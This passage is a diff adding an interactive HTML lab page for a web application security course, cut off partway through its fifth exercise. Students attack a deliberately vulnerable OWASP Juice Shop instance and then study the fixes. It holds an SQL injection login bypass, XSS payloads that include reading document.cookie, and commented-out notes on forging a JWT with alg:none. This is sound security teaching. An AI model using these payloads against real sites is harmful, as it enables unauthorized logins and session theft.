@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 3 Lab — Web Application Security</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#f0f4f8;
+  --card:#ffffff;
+  --navy:#1D3461;
+  --navy-light:#2a4a87;
+  --teal:#0F6E56;
+  --teal-bg:#E1F5EE;
+  --teal-bd:#5DCAA5;
+  --purple:#3C3489;
+  --purple-bg:#EEEDFE;
+  --purple-bd:#AFA9EC;
+  --amber:#633806;
+  --amber-bg:#FAEEDA;
+  --amber-bd:#EF9F27;
+  --red:#791F1F;
+  --red-bg:#FCEBEB;
+  --red-bd:#F09595;
+  --blue-bg:#E6F1FB;
+  --blue-bd:#85B7EB;
+  --txt:#1d1d1c;
+  --txt2:#5f5e5a;
+  --txt3:#888780;
+  --bdr:#d8d6cf;
+  --bdr2:#b8b6af;
+  --radius:10px;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+
+html,body{min-height:100%;background:var(--bg);font-family:var(--sans);color:var(--txt);font-size:15px;line-height:1.6}
+
+.shell{display:flex;min-height:100vh}
+.sidebar{width:260px;flex-shrink:0;background:var(--navy);position:sticky;top:0;height:100vh;overflow-y:auto;padding:1.5rem 0}
+.main{flex:1;max-width:820px;padding:2rem 2.5rem 4rem;min-width:0}
+@media(max-width:768px){.sidebar{display:none}.main{padding:1.25rem 1rem 3rem}}
+
+.sidebar-logo{font-size:17px;font-weight:700;color:#fff;padding:0 1.25rem;margin-bottom:1.5rem;display:flex;align-items:center;gap:8px;line-height:1.3}
+.sidebar-logo .mod-badge{font-size:11px;font-weight:600;background:rgba(93,202,165,.2);color:#5DCAA5;border-radius:4px;padding:2px 7px;letter-spacing:.05em}
+.sidebar-title{font-size:11px;font-weight:600;color:rgba(255,255,255,.45);letter-spacing:.08em;text-transform:uppercase;padding:0 1.25rem;margin-bottom:.75rem}
+.nav-item{display:flex;align-items:center;gap:10px;padding:.55rem 1.25rem;cursor:pointer;transition:background .15s;font-size:13px;color:rgba(255,255,255,.75);border-left:3px solid transparent}
+.nav-item:hover{background:rgba(255,255,255,.08)}
+.nav-item.active{background:rgba(255,255,255,.12);color:#fff;border-left-color:#5DCAA5}
+.nav-item.done{color:rgba(255,255,255,.85)}
+.nav-dot{width:20px;height:20px;border-radius:50%;border:2px solid rgba(255,255,255,.3);display:flex;align-items:center;justify-content:center;font-size:10px;flex-shrink:0;transition:all .2s}
+.nav-dot.done{background:#5DCAA5;border-color:#5DCAA5;color:#fff}
+.nav-dot.active{border-color:#fff;color:#fff}
+.progress-bar-wrap{padding:1rem 1.25rem .5rem;margin-top:.5rem}
+.progress-bar-label{font-size:11px;color:rgba(255,255,255,.5);margin-bottom:6px;display:flex;justify-content:space-between}
+.progress-bar{height:4px;background:rgba(255,255,255,.15);border-radius:2px;overflow:hidden}
+.progress-fill{height:100%;background:#5DCAA5;border-radius:2px;transition:width .4s ease}
+
+.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.75rem;flex-wrap:wrap;gap:12px}
+.topbar-left h1{font-size:22px;font-weight:700;color:var(--navy);margin-bottom:2px}
+.topbar-left p{font-size:13px;color:var(--txt2)}
+.topbar-right{display:flex;gap:8px;align-items:center}
+button{font-family:var(--sans);cursor:pointer;border:none;border-radius:8px;font-size:13px;font-weight:500;padding:8px 16px;transition:all .15s}
+button:disabled{opacity:.4;cursor:not-allowed}
+.btn-ghost{background:transparent;border:1.5px solid var(--bdr2);color:var(--txt2)}
+.btn-ghost:hover:not(:disabled){background:var(--card);border-color:var(--navy);color:var(--navy)}
+.btn-primary{background:var(--navy);color:#fff}
+.btn-primary:hover:not(:disabled){background:var(--navy-light)}
+.btn-success{background:#0F6E56;color:#fff}
+.btn-success:hover:not(:disabled){background:#0d5c47}
+
+.student-banner{background:var(--card);border:1.5px solid var(--bdr);border-radius:var(--radius);padding:1.25rem 1.5rem;margin-bottom:1.75rem;box-shadow:0 1px 3px rgba(0,0,0,.06)}
+.student-banner h3{font-size:12px;font-weight:600;color:var(--txt2);text-transform:uppercase;letter-spacing:.06em;margin-bottom:.75rem}
+.student-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:520px){.student-grid{grid-template-columns:1fr}}
+.field-group{display:flex;flex-direction:column;gap:4px}
+.field-group label{font-size:12px;font-weight:600;color:var(--txt2)}
+.field-group input{border:1.5px solid var(--bdr);border-radius:6px;padding:7px 10px;font-size:14px;font-family:var(--sans);color:var(--txt);background:var(--bg);transition:border .15s}
+.field-group input:focus{outline:none;border-color:var(--navy);background:#fff}
+
+.exercise-card{background:var(--card);border:1.5px solid var(--bdr);border-radius:var(--radius);margin-bottom:1.5rem;box-shadow:0 1px 3px rgba(0,0,0,.06);overflow:hidden;display:none}
+.exercise-card.visible{display:block}
+.exercise-header{padding:1.25rem 1.5rem 1rem;border-bottom:1.5px solid var(--bdr)}
+.exercise-tag{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;display:inline-block;padding:2px 8px;border-radius:4px;margin-bottom:6px}
+.exercise-title{font-size:19px;font-weight:700;color:var(--navy);margin-bottom:3px}
+.exercise-desc{font-size:13px;color:var(--txt2)}
+.exercise-body{padding:1.25rem 1.5rem}
+.exercise-progress{display:flex;align-items:center;gap:8px;margin-top:.75rem}
+.ex-prog-bar{flex:1;height:5px;background:var(--bg);border-radius:3px;overflow:hidden}
+.ex-prog-fill{height:100%;background:var(--teal-bd);border-radius:3px;transition:width .3s}
+.ex-prog-label{font-size:11px;color:var(--txt3);white-space:nowrap}
+
+.info-box{border-radius:8px;padding:1rem 1.25rem;margin-bottom:1.25rem;border:.5px solid}
+.info-box h4{font-size:13px;font-weight:700;margin-bottom:.4rem}
+.info-box p,.info-box ul{font-size:13.5px;line-height:1.7}
+.info-box ul{padding-left:1.25rem}
+.info-box.teal{background:var(--teal-bg);border-color:var(--teal-bd)}.info-box.teal h4{color:var(--teal)}
+.info-box.purple{background:var(--purple-bg);border-color:var(--purple-bd)}.info-box.purple h4{color:var(--purple)}
+.info-box.amber{background:var(--amber-bg);border-color:var(--amber-bd)}.info-box.amber h4{color:var(--amber)}
+.info-box.red{background:var(--red-bg);border-color:var(--red-bd)}.info-box.red h4{color:var(--red)}
+.info-box.blue{background:var(--blue-bg);border-color:var(--blue-bd)}.info-box.blue h4{color:#0C447C}
+.info-box.gray{background:#f4f3ee;border-color:var(--bdr)}.info-box.gray h4{color:var(--txt2)}
+
+.section-heading{font-size:15px;font-weight:700;color:var(--navy);margin:1.5rem 0 .75rem;padding-bottom:.4rem;border-bottom:2px solid var(--blue-bg)}
+.step-label{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:700;color:var(--navy);background:var(--blue-bg);border-radius:4px;padding:3px 10px;margin-bottom:.6rem}
+
+.question-block{margin-bottom:1.25rem}
+.question-text{font-size:14px;font-weight:600;color:var(--txt);margin-bottom:.5rem;line-height:1.5}
+.question-text .qnum{color:var(--navy);margin-right:4px}
+textarea{width:100%;border:1.5px solid var(--bdr);border-radius:8px;padding:10px 12px;font-size:13.5px;font-family:var(--sans);color:var(--txt);background:var(--bg);resize:vertical;transition:border .15s;line-height:1.6}
+textarea:focus{outline:none;border-color:var(--navy);background:#fff}
+textarea.answered{border-color:var(--teal-bd);background:#fafffe}
+
+.table-wrap{overflow-x:auto;margin-bottom:1rem;border-radius:8px;border:1.5px solid var(--bdr)}
+.lab-table{width:100%;border-collapse:collapse;font-size:13px}
+.lab-table th{background:var(--navy);color:#fff;padding:8px 10px;text-align:left;font-weight:600;font-size:12px}
+.lab-table td{border-bottom:1px solid var(--bdr);padding:6px 8px;vertical-align:top}
+.lab-table tr:last-child td{border-bottom:none}
+.lab-table tr:nth-child(even) td{background:#fafaf8}
+.lab-table td input[type=text],.lab-table td select{width:100%;border:1px solid var(--bdr);border-radius:4px;padding:5px 7px;font-size:12.5px;font-family:var(--sans);background:#fff;color:var(--txt)}
+.lab-table td input[type=text]:focus,.lab-table td select:focus{outline:none;border-color:var(--navy)}
+.lab-table .row-label{font-weight:600;color:var(--navy);background:#f4f3ee !important;white-space:nowrap;font-size:12.5px;width:30%}
+
+.cmd-block{background:#1e2b3c;border-radius:8px;padding:.75rem 1rem;margin:.5rem 0 .9rem;font-family:var(--mono);font-size:13px;color:#c8d8e8;line-height:1.8}
+.cmd-block .os-tag{display:inline-block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;margin-bottom:.3rem}
+.cmd-block .os-tag.win{color:#7FC3E8}
+.cmd-block .os-tag.mac{color:#5DCAA5}
+.cmd-block .os-tag.red{color:#F09595}
+.cmd-block .cmd{color:#fff}
+.cmd-block .hl{color:#FFD166;font-weight:700}
+.cmd-block .cmt{color:#7a8899}
+
+.vuln-badge{display:inline-block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;padding:2px 8px;border-radius:4px;margin-bottom:.5rem}
+
+.owasp-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-bottom:1rem}
+@media(max-width:520px){.owasp-grid{grid-template-columns:1fr}}
+.owasp-item{border:1.5px solid var(--bdr);border-radius:7px;padding:.6rem .85rem;font-size:12.5px}
+.owasp-item .owasp-num{font-family:var(--mono);font-weight:700;color:var(--navy);font-size:11px;margin-bottom:2px}
+.owasp-item .owasp-name{font-weight:600;color:var(--txt);font-size:13px}
+.owasp-item .owasp-desc{color:var(--txt2);font-size:11.5px;margin-top:2px}
+
+.quiz-block{margin-bottom:1rem}
+.quiz-q{font-size:13.5px;font-weight:600;color:var(--txt);margin-bottom:.45rem;line-height:1.5}
+.quiz-opts{display:flex;flex-direction:column;gap:6px}
+.quiz-opt{display:flex;align-items:center;gap:8px;padding:7px 12px;border:1.5px solid var(--bdr);border-radius:7px;cursor:pointer;font-size:13px;color:var(--txt);background:var(--card);transition:all .15s;user-select:none}
+.quiz-opt:hover{border-color:var(--navy);background:var(--blue-bg)}
+.quiz-opt.selected{border-color:var(--navy);background:var(--blue-bg);font-weight:500}
+.quiz-opt.correct{border-color:var(--teal-bd);background:var(--teal-bg);color:var(--teal);font-weight:600}
+.quiz-opt.wrong{border-color:var(--red-bd);background:var(--red-bg);color:var(--red)}
+.quiz-fb{font-size:12px;margin-top:.35rem;padding:.4rem .75rem;border-radius:5px;display:none}
+.quiz-fb.show{display:block}
+.quiz-fb.ok{background:var(--teal-bg);color:var(--teal);border:1px solid var(--teal-bd)}
+.quiz-fb.no{background:var(--red-bg);color:var(--red);border:1px solid var(--red-bd)}
+
+.nav-btns{display:flex;justify-content:space-between;align-items:center;margin-top:1.75rem;padding-top:1.25rem;border-top:1.5px solid var(--bdr)}
+.nav-btns-right{display:flex;gap:8px}
+
+.completion-card{background:var(--card);border:2px solid var(--teal-bd);border-radius:var(--radius);padding:2rem;text-align:center;box-shadow:0 4px 16px rgba(15,110,86,.12);display:none}
+.completion-card.visible{display:block}
+.completion-card .check{font-size:52px;margin-bottom:.75rem}
+.completion-card h2{font-size:24px;font-weight:700;color:var(--teal);margin-bottom:.5rem}
+.completion-card p{font-size:15px;color:var(--txt2);margin-bottom:1.5rem}
+.completion-actions{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+
+.toast{position:fixed;bottom:1.25rem;right:1.25rem;background:var(--navy);color:#fff;font-size:13px;padding:9px 16px;border-radius:8px;opacity:0;transform:translateY(8px);transition:all .3s;pointer-events:none;z-index:100}
+.toast.show{opacity:1;transform:translateY(0)}
+
+.ilog{font-family:var(--mono);font-size:11px;background:#f4f3ee;border:1px solid var(--bdr);border-radius:6px;padding:.5rem .75rem;max-height:80px;overflow-y:auto;color:var(--txt2);margin-top:.5rem}
+.il-e{padding:1px 0;border-bottom:.5px solid var(--bdr)}
+.il-e:last-child{border-bottom:none}
+.il-w{color:#A32D2D;font-weight:500}
+.strike-chip{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:600;color:#633806;background:#FAEEDA;border:1.5px solid #EF9F27;border-radius:20px;padding:4px 12px}
+.strike-chip.danger{color:#791F1F;background:#FCEBEB;border-color:#F09595}
+
+.ap-overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:1000;display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .2s}
+.ap-overlay.show{opacity:1;pointer-events:all}
+.ap-modal{background:#fff;border-radius:14px;padding:2rem 2.25rem;max-width:440px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.25);transform:scale(.93);transition:transform .2s}
+.ap-overlay.show .ap-modal{transform:scale(1)}
+.ap-modal .ap-icon{font-size:44px;margin-bottom:.75rem}
+.ap-modal h2{font-size:19px;font-weight:700;color:#791F1F;margin-bottom:.5rem}
+.ap-modal p{font-size:13.5px;color:#5f5e5a;margin-bottom:1.25rem;line-height:1.6}
+.ap-modal .strikes-row{display:flex;justify-content:center;gap:8px;margin-bottom:1.25rem}
+.ap-sdot{width:16px;height:16px;border-radius:50%;border:2px solid #EF9F27;background:#fff;transition:background .3s}
+.ap-sdot.hit{background:#A32D2D;border-color:#A32D2D}
+.ap-modal .ap-dismiss{background:#1D3461;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;padding:10px 28px;cursor:pointer;transition:background .15s;margin-top:.25rem}
+.ap-modal .ap-dismiss:hover{background:#2a4a87}
+.ap-sub{font-size:12.5px;color:#A32D2D;margin-bottom:1rem;min-height:18px}
+
+@media print{
+  .sidebar,.topbar-right,.nav-btns,.toast,.ap-overlay{display:none !important}
+  .main{padding:0;max-width:100%}
+  .exercise-card{display:block !important;break-inside:avoid;box-shadow:none;border:1px solid #ccc;margin-bottom:1rem}
+  .completion-card{display:none !important}
+  textarea{border:1px solid #ccc;min-height:50px}
+  body{font-size:12px}
+}
+</style>
+</head>
+<body>
+
+<div class="ap-overlay" id="apOverlay">
+  <div class="ap-modal">
+    <div class="ap-icon">⚠️</div>
+    <h2>Paste detected</h2>
+    <p id="apMsg">Copy-pasting is not allowed in this lab. Please type your answer in your own words — this helps demonstrate your understanding. The pasted text has been discarded.</p>
+    <div class="strikes-row" id="apStrikeRow"></div>
+    <p id="apSubMsg" class="ap-sub"></p>
+    <button class="ap-dismiss" onclick="dismissWarning()">I understand — I will type my answer</button>
+  </div>
+</div>
+
+<div class="shell">
+
+<nav class="sidebar" id="sidebar">
+  <div class="sidebar-logo">
+    🔐 Web App Security
+    <span class="mod-badge">Mod 3</span>
+  </div>
+  <div class="sidebar-title">Exercises</div>
+  <div id="navItems"></div>
+  <div class="progress-bar-wrap">
+    <div class="progress-bar-label"><span>Overall progress</span><span id="progPct">0%</span></div>
+    <div class="progress-bar"><div class="progress-fill" id="progFill" style="width:0%"></div></div>
+  </div>
+</nav>
+
+<main class="main">
+  <div class="topbar">
+    <div class="topbar-left">
+      <h1>🔐 Module 3 — Web Application Security</h1>
+      <p>Computer Networks Lab · Developer Track · est. 90 min</p>
+    </div>
+    <div class="topbar-right">
+      <div class="strike-chip" id="strikeChip" style="display:none">⚠ Paste detected</div>
+      <button class="btn-ghost" onclick="saveDraft()">💾 Save draft</button>
+      <button class="btn-ghost" onclick="window.print()">🖨 Print / PDF</button>
+    </div>
+  </div>
+
+  <div class="student-banner">
+    <h3>Student information</h3>
+    <div class="student-grid">
+      <div class="field-group"><label for="f-name">Full name</label><input type="text" id="f-name" placeholder="Your name" oninput="updateProgress()"></div>
+      <div class="field-group"><label for="f-id">Student ID</label><input type="text" id="f-id" placeholder="e.g. s1234567" oninput="updateProgress()"></div>
+      <div class="field-group"><label for="f-class">Class / section</label><input type="text" id="f-class" placeholder="e.g. CN3-A" oninput="updateProgress()"></div>
+      <div class="field-group"><label for="f-date">Date</label><input type="date" id="f-date" oninput="updateProgress()"></div>
+    </div>
+    <div style="margin-top:.9rem">
+      <div style="font-size:11px;font-weight:600;color:var(--txt3);text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px">Academic integrity log</div>
+      <div class="ilog" id="ilog"><div class="il-e">Lab opened — integrity monitoring active.</div></div>
+    </div>
+  </div>
+
+  <div id="exerciseContainer"></div>
+
+  <div class="completion-card" id="completionCard">
+    <div class="check">✅</div>
+    <h2>Lab complete!</h2>
+    <p>All questions answered. Download your responses and submit the JSON file to your course portal.</p>
+    <div class="completion-actions">
+      <button class="btn-success" onclick="downloadJSON()">⬇ Download answers (.json)</button>
+      <button class="btn-primary" onclick="window.print()">🖨 Save as PDF</button>
+      <button class="btn-ghost" onclick="goTo(0)">↺ Review from start</button>
+    </div>
+  </div>
+</main>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ═══════════════════════════════════════════════
+// DATA
+// ═══════════════════════════════════════════════
+var EXERCISES = [
+
+// ─────────────────────────────────────────────
+// EX 1 — SQL Injection
+// ─────────────────────────────────────────────
+{
+  id:'ex1', tag:'Exercise 1 · ~20 min', tagColor:'#791F1F', tagBg:'#FCEBEB',
+  title:'SQL Injection',
+  desc:'Bypass a login form using a classic injection payload, trace exactly what the database sees, then fix the vulnerability as a developer.',
+  setup:'Open OWASP Juice Shop in your browser. Use the online demo at <strong>http://203.154.91.38:3000</strong>. This is a purposely-broken app. Everything here is legal and intentional.',
+  sections:[
+    {
+      heading:'Part 1 — The Attack',
+      type:'info', color:'red',
+      title:'Goal: log in as administrator without knowing the password',
+      body:'Go to the Juice Shop login page. In the <strong>Email</strong> field type exactly: <code style="font-family:var(--mono);font-size:12.5px;background:#f9e0e0;padding:1px 6px;border-radius:3px">\' OR 1=1 --</code> &nbsp; In the <strong>Password</strong> field type anything. Click Login.'
+    },
+    {
+      heading:'Task 1A — What happened?',
+      questions:[
+        { id:'1a1', text:'Did the login succeed? Which account were you logged in as? (Check the top-right corner of Juice Shop.)', rows:2 },
+      ]
+    },
+    {
+      heading:'Task 1B — Trace the SQL',
+      intro:'The server builds a SQL query using your input directly. Fill in the table below to show what the database receives before and after injection:',
+      type:'sql-trace-table'
+    },
+    {
+      heading:'Task 1C — Why does 1=1 work?',
+      questions:[
+        { id:'1c1', text:'The condition 1=1 is always true. Explain in your own words: why does adding this condition allow the attacker to bypass the password check?', rows:3 },
+        { id:'1c2', text:'What does the -- (double dash) at the end of the payload do? What part of the original query does it remove?', rows:2 },
+        { id:'1c3', text:'The attack logged you in as the first user in the database. Why is that the administrator account in most apps? What does this tell you about the order records are inserted?', rows:3 },
+      ]
+    },
+    {
+      heading:'Part 2 — The Fix',
+      type:'info', color:'teal',
+      title:'Developers: how do you prevent SQL injection?',
+      body:'The root cause is <strong>string concatenation</strong> — user input is pasted directly into the SQL string. The fix is <strong>parameterized queries</strong> (also called prepared statements): the query structure is compiled first, then user values are passed separately and treated as pure data — never as executable SQL.'
+    },
+    {
+      heading:'Task 1D — Vulnerable vs safe code',
+      type:'sql-fix-comparison'
+    },
+    {
+      heading:'Task 1E — Reflection',
+      questions:[
+        { id:'1e1', text:'A developer says: "We validate the email format on the front end (JavaScript), so we are protected from SQL injection." Why is this completely wrong? Give a specific reason.', rows:3 },
+        { id:'1e2', text:'Beyond authentication bypass, list two other things an attacker could do with SQL injection if they had full control of the query (e.g. DROP, UNION SELECT, etc.)', rows:3 },
+        { id:'1e3', text:'SQL injection has been in the OWASP Top 10 since the list began in 2003. Why do you think developers still make this mistake in 2025?', rows:3 },
+      ]
+    }
+  ]
+},
+
+// ─────────────────────────────────────────────
+// EX 2 — Cross-Site Scripting (XSS)
+// ─────────────────────────────────────────────
+{
+  id:'ex2', tag:'Exercise 2 · ~20 min', tagColor:'#633806', tagBg:'#FAEEDA',
+  title:'Cross-Site Scripting (XSS)',
+  desc:'Inject JavaScript into the Juice Shop search bar, steal a session cookie in one line of code, and understand the difference between Reflected and Stored XSS.',
+  setup:'Keep Juice Shop (<strong>http://203.154.91.38:3000</strong>) open. You will use the search bar and browser DevTools (F12 → Console tab).',
+  sections:[
+    {
+      heading:'Part 1 — Reflected XSS',
+      type:'info', color:'amber',
+      title:'Goal: make the browser execute JavaScript from a URL',
+      body:'Reflected XSS is when the server echoes your input back in the response without sanitizing it. The script only runs for the person who clicks the crafted link — it is not saved.'
+    },
+    {
+      heading:'Task 2A — Basic injection',
+      intro:'Type the following into the Juice Shop search bar and press Enter:',
+      type:'xss-cmd',
+      payload:'&lt;iframe src="javascript:alert(\'XSS\')"&gt;'
+    },
+    {
+      heading:'Task 2A — Questions',
+      questions:[
+        { id:'2a1', text:'What did you see in the browser? Where is this JavaScript executing — in your browser or on the server?', rows:2 },
+        { id:'2a2', text:'Look at the URL in your address bar after searching. The payload appears in the URL. Why does this make Reflected XSS dangerous to other users, even though you typed it yourself?', rows:3 },
+      ]
+    },
+    {
+      heading:'Part 2 — Cookie Theft',
+      type:'info', color:'red',
+      title:'Goal: read the session cookie using JavaScript',
+      body:'If an application does not set the <code style="font-family:var(--mono);font-size:12px;background:#f9e0e0;padding:1px 5px;border-radius:3px">HttpOnly</code> flag on cookies, any JavaScript on the page can read them using <code style="font-family:var(--mono);font-size:12px;background:#f9e0e0;padding:1px 5px;border-radius:3px">document.cookie</code>. Log in to Juice Shop first (use any email/password), then try the payload below.'
+    },
+    {
+      heading:'Task 2B — Read the cookie',
+      intro:'Search for this payload in Juice Shop (after logging in):',
+      type:'xss-cmd',
+      //payload:'&lt;script&gt;alert(document.cookie)&lt;/script&gt;'
+      payload:'&lt;iframe src="javascript:alert(document.cookie)"&gt;'
+
+    },
+    {
+      heading:'Task 2B — Observe and record',
+      type:'cookie-theft-table'
+    },
+    {
+      heading:'Task 2B — Questions',
+      questions:[
+        { id:'2b1', text:'What did the alert box show? Could you see a session token or JWT?', rows:2 },
+        { id:'2b2', text:'If a real attacker stole your session cookie and sent it to their own server, what could they do with it? What would this look like from the server\'s perspective?', rows:3 },
+      ]
+    },
+    // {
+    //   heading:'Part 3 — Reflected vs Stored XSS',
+    //   type:'xss-comparison-table'
+    // },
+    {
+      heading:'Part 3 — The Fix',
+      type:'info', color:'teal',
+      title:'How developers prevent XSS',
+      body:'<strong>1. Output encoding:</strong> convert special characters like &lt; and &gt; into their HTML entities (&amp;lt; &amp;gt;) so the browser renders them as text, not as tags.<br><br><strong>2. Content Security Policy (CSP):</strong> an HTTP header that tells the browser which scripts are allowed to run. Blocks inline &lt;script&gt; tags entirely.<br><br><strong>3. HttpOnly cookie flag:</strong> prevents JavaScript from reading the cookie at all, even if XSS succeeds.'
+    },
+    {
+      heading:'Task 2C — Match the fix',
+      type:'xss-fix-quiz'
+    },
+    {
+      heading:'Task 2D — Reflection',
+      questions:[
+        { id:'2d1', text:'A developer sanitizes input before saving it to the database. They believe this is enough to prevent XSS. Explain why output encoding (at render time) is also required.', rows:3 },
+        { id:'2d2', text:'You are building a comment section for a blog. Users can post comments that other users see. Which type of XSS is more dangerous here — Reflected or Stored? Explain why.', rows:3 },
+      ]
+    }
+  ]
+},
+
+// ─────────────────────────────────────────────
+// EX 3 — CSRF
+// ─────────────────────────────────────────────
+{
+  id:'ex3', tag:'Exercise 3 · ~15 min', tagColor:'#3C3489', tagBg:'#EEEDFE',
+  title:'Cross-Site Request Forgery (CSRF)',
+  desc:'Understand how CSRF tricks an authenticated browser into performing actions the user never intended, and learn how CSRF tokens break the attack.',
+  setup:'Keep Juice Shop open and remain logged in. Open a second browser tab for the attacker\'s page simulation.',
+  sections:[
+    {
+      heading:'How CSRF works',
+      type:'info', color:'purple',
+      title:'The attack in plain English',
+      body:'When you are logged into a website, your browser automatically sends your session cookie with every request to that site. A CSRF attack tricks your browser into making a request to a site you are already logged into — from a different, malicious page. The server sees a valid cookie and executes the action, not knowing you never intended it.'
+    },
+    {
+      heading:'Task 3A — Trace the CSRF flow',
+      intro:'Read the scenario below and answer the questions. No hands-on action required — reason through the flow carefully.',
+      type:'csrf-scenario'
+    },
+    {
+      heading:'Task 3A — Questions',
+      questions:[
+        { id:'3a1', text:'In the CSRF scenario, why does the bank server accept the forged request? What does it see that makes the request look legitimate?', rows:3 },
+        { id:'3a2', text:'Why can\'t the attacker simply steal the session cookie and replay it from their own machine instead of using CSRF?', rows:3 },
+        { id:'3a3', text:'The attack works because HTTP is stateless and cookies are sent automatically. Explain in one sentence how the SameSite=Strict cookie attribute stops this attack.', rows:2 },
+      ]
+    },
+    {
+      heading:'Part 2 — CSRF Tokens',
+      type:'info', color:'teal',
+      title:'How CSRF tokens break the attack',
+      body:'A <strong>CSRF token</strong> is a secret, random value generated by the server and embedded in every HTML form. When the form is submitted, the server checks that the token matches. An attacker on a different origin cannot read the token (same-origin policy blocks cross-origin reads), so they cannot forge a valid request.'
+    },
+    {
+      heading:'Task 3B — Inspect a CSRF token in Juice Shop',
+      intro:'Open DevTools (F12) → Network tab. In Juice Shop, go to the "Change Password" page and look at the form submission. Try to find a hidden CSRF token field in the page source (right-click → View Page Source, Ctrl+F for "csrf" or "_token").',
+      questions:[
+        { id:'3b1', text:'Did you find a CSRF token in Juice Shop\'s forms? If yes, describe where it appeared. If no, what does this tell you about Juice Shop\'s security posture?', rows:3 },
+        { id:'3b2', text:'A CSRF token only works if it is different for every user session AND unpredictable. Why would a token like csrf_token=user_12345 be ineffective?', rows:3 },
+      ]
+    },
+    {
+      heading:'Task 3C — CSRF vs XSS',
+      type:'csrf-vs-xss-table'
+    },
+    {
+      heading:'Task 3D — Reflection',
+      questions:[
+        { id:'3d1', text:'A developer says: "We check the Referer header to prevent CSRF — if it\'s not our domain, we reject the request." Give one reason why this is not a reliable defence.', rows:3 },
+        { id:'3d2', text:'Modern browsers support the SameSite cookie attribute. If all browsers enforced SameSite=Strict by default, would CSRF tokens still be needed? Justify your answer.', rows:3 },
+      ]
+    }
+  ]
+},
+
+// ─────────────────────────────────────────────
+// EX 4 — Broken Authentication & JWT
+// ─────────────────────────────────────────────
+{
+  id:'ex4', tag:'Exercise 4 · ~20 min', tagColor:'#0C447C', tagBg:'#E6F1FB',
+  title:'Broken Authentication & JWT Attacks',
+  desc:'Decode a JSON Web Token, exploit the "alg:none" vulnerability, and understand why server-side validation is non-negotiable.',
+  setup:'You need a browser and the site <strong><a href="https://jwt.io" target="_blank" style="color:var(--navy)">https://jwt.io</a></strong> open in a tab. No Juice Shop login required for Part 1.',
+  sections:[
+    {
+      heading:'Part 1 — Decode a JWT',
+      type:'info', color:'blue',
+      title:'What is a JSON Web Token?',
+      body:'A JWT is a Base64-encoded token with three parts separated by dots: <strong>Header.Payload.Signature</strong>. The header says which algorithm was used. The payload contains claims (user ID, role, expiry). The signature proves the token was issued by the server and has not been tampered with — but only if the server checks it correctly.'
+    },
+    {
+      heading:'Task 4A — Log in and capture your JWT',
+      intro:'Log in to Juice Shop (any account). Open DevTools → Application tab → Local Storage → http://203.154.91.38:3000/. Find the key named <strong>token</strong>. Copy the value.',
+      type:'jwt-parts-table'
+    },
+    {
+      heading:'Task 4A — Decode at jwt.io',
+      intro:'Paste your token into the Debugger at https://jwt.io. The site will decode it automatically. Record what you find:',
+      questions:[
+        { id:'4a1', text:'What fields are in the PAYLOAD section? List all the keys and their values (e.g. email, iat, exp). What does "iat" represent — convert the Unix timestamp to a readable date.', rows:4 },
+        { id:'4a2', text:'Is the SIGNATURE valid (shown as "Signature Verified" in green)? Without knowing the secret key, can you forge a new valid token? Why or why not?', rows:3 },
+      ]
+    },
+    // // {
+    // //   heading:'Part 2 — The alg:none Attack',
+    // //   type:'info', color:'red',
+    // //   title:'The most dangerous JWT vulnerability',
+    // //   body:'The JWT spec allows <code style="font-family:var(--mono);font-size:12px;background:#f9e0e0;padding:1px 5px;border-radius:3px">alg: "none"</code> — meaning "no signature required." A buggy server that accepts this skips signature verification entirely. An attacker can modify the payload (e.g. change their role to "admin") and the server trusts it without question.'
+    // // },
+    // {
+    //   heading:'Task 4B — Forge a token',
+    //   type:'jwt-forge-steps'
+    // },
+    // {
+    //   heading:'Task 4B — Questions',
+    //   questions:[
+    //     { id:'4b1', text:'After forging the token with alg:none and role:admin, did Juice Shop accept it? What changed in the application UI? (If Juice Shop rejects it, explain what a vulnerable server would do differently.)', rows:3 },
+    //     { id:'4b2', text:'Why is the alg:none attack so dangerous compared to brute-forcing the secret key? Think about time and computational effort.', rows:3 },
+    //     { id:'4b3', text:'As a developer using a JWT library, what is the single most important validation you must perform when receiving a token?', rows:2 },
+    //   ]
+    // },
+    {
+      heading:'Part 3 — Authentication Best Practices Quiz',
+      type:'auth-quiz'
+    },
+    {
+      heading:'Task 4C — Reflection',
+      questions:[
+        { id:'4c1', text:'A developer stores the JWT in localStorage (as Juice Shop does). A security engineer says cookies with HttpOnly and Secure flags are safer. Explain the specific attack that localStorage enables but HttpOnly cookies prevent.', rows:3 },
+        { id:'4c2', text:'JWTs are stateless — the server does not store them. This means once issued, a JWT cannot be revoked until it expires. Describe a real scenario where this is a serious problem (e.g. a user logs out or changes their password).', rows:3 },
+      ]
+    }
+  ]
+},
+
+// ─────────────────────────────────────────────
+// EX 5 — Challenge: The DevShop Breach
+// ─────────────────────────────────────────────
+{
+  id:'ex5', tag:'Exercise 5 · ~15 min', tagColor:'#0F6E56', tagBg:'#E1F5EE',
+  title:'Challenge — The DevShop Breach',
+  desc:'Apply everything from this lab to diagnose a real-world attack chain. No tools needed — reason from what you have learned.',
+  setup:'Read the incident report carefully before answering. Every question links directly to something you practised in Exercises 1–4.',
+  sections:[
+    {
+      heading:'Incident Report: DevShop',
+      type:'incident-report'
+    },
+    {
+      heading:'Task 5A — Identify the vulnerabilities',
+      questions:[
